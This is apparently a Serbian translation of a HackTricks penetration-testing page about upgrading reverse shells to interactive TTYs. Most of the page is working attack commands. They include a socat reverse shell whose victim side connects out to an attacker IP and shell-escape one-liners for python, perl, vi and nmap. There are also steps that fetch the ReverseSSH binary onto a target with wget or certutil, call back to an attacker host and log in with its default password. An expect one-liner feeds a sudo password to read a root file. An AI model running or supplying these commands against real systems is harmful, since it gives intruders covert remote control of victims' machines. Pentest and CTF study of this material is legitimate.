# Puni TTY-ji

{{#include ../../banners/hacktricks-training.md}}

## Puni TTY

Imajte na umu da shell koji postavite u promenljivoj `SHELL` **mora biti** **naveden unutar** _**/etc/shells**_ ili će se prikazati poruka `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Takođe, imajte na umu da sledeći snippets rade samo u bash-u. Ako ste u zsh-u, pre preuzimanja shell-a pređite na bash pokretanjem komande `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Možete dobiti **broj** **redova** i **kolona** izvršavanjem **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Pokretanje shell-ova**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Praktičan način za **interaktivni pristup shell-u**, kao i za **prenos fajlova** i **prosleđivanje portova**, jeste postavljanje statički linkovanog ssh servera [ReverseSSH](https://github.com/Fahrj/reverse-ssh) na ciljnom sistemu.<sup>[[1]](#references)</sup>

U nastavku je primer za `x86` sa UPX-kompresovanim binarnim fajlovima. Za druge binarne fajlove pogledajte [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Lokalno se pripremite za prihvatanje zahteva za ssh port forwarding:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Linux meta:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Windows 10 cilj (za starije verzije, pogledajte [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Ako je zahtev za prosleđivanje porta ReverseSSH bio uspešan, sada bi trebalo da možete da se prijavite koristeći podrazumevanu lozinku `letmeinbrudipls` u kontekstu korisnika koji pokreće `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) automatski nadograđuje Linux reverse shells na TTY, upravlja veličinom terminala, beleži sve i još mnogo toga. Takođe pruža readline podršku za Windows shells.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Bez TTY

Ako iz nekog razloga ne možete da dobijete puni TTY, **i dalje možete da komunicirate sa programima** koji očekuju korisnički unos. U sledećem primeru, lozinka se prosleđuje komandi `sudo` kako bi pročitala datoteku:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Reference

- [1] [ReverseSSH - Statically-linked ssh server sa reverse shell funkcionalnošću za CTF-ove i slično](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - Shell handler koji automatizuje nekoliko stvari kako bi olakšao život](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
